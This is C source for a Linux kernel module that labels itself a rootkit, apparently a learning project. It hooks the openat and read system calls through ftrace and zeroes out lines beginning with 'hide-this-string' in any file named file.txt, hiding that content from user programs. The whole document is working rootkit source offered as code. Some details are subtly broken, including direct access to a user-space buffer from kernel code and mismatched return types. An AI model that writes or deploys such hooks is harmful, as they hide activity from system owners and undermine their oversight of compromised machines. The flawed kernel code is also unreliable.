// These includes will always be required
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "ftrace_helper.h"

// These are built in Macros
MODULE_LICENSE("GPL");
MODULE_AUTHOR("L15t3Nr");
MODULE_DESCRIPTION("Linux Kernel Module Project");
MODULE_VERSION("0.01");

#define HIDE_STRING "hide-this-string"

static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_read)(const struct pt_regs *);
static bool file_txt_opened = false;
static int tamper_fd;
static int is_filetxt(const char *filename)
{
    const char *ptr = filename;
    while ((ptr = strstr(ptr, "file.txt")) != NULL) {
        if ((ptr == filename || *(ptr - 1) == '/') && (*(ptr + 8) == '\0' || *(ptr + 8) == '/')) {
            return 1;
        }
        ptr += 8;
    }
    return 0;
}

asmlinkage int hook_openat(const struct pt_regs *regs)
{
    const char __user *filename = (const char __user *)regs->si;
    char opened_filename[NAME_MAX] = {0};

    long openError = strncpy_from_user(opened_filename, filename, NAME_MAX);
    if (openError < 0) {
        return openError;
    }

    if (is_filetxt(opened_filename)) {
        tamper_fd = orig_openat(regs);
        printk(KERN_INFO "FD: %ld\nFN: %s\n", tamper_fd, opened_filename);
        return tamper_fd;
    }
    return orig_openat(regs);
}

asmlinkage int hook_read(const struct pt_regs *regs)
{
    unsigned int fd = regs->di;
    char __user *buf = regs->si;
    size_t count = regs->dx;

    int i, ret;

    if ( (tamper_fd == fd) &&
        (tamper_fd != 0) &&
        (tamper_fd != 1) &&
        (tamper_fd != 2) )
    {
        ret = orig_read(regs);

        char *line_start = buf;
        for (i = 0; i < count; ++i) {
            if (buf[i] == '\n' || i == count - 1) {
                int line_length = (i - (line_start - buf)) + 1;
                if (strncmp(line_start, HIDE_STRING, strlen(HIDE_STRING)) == 0) {
                    memset(line_start, 0, line_length);
                }
            line_start = &buf[i + 1];
            }
        }
        return ret;
    }
    return orig_read(regs);
}

static struct ftrace_hook hook[] = {
    HOOK("sys_openat", hook_openat, &orig_openat),
    HOOK("sys_read", hook_read, &orig_read),
};

static int __init rootkit_init(void)
{
    int err;
    err = fh_install_hooks(hook, ARRAY_SIZE(hook));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: loaded\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hook, ARRAY_SIZE(hook));
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
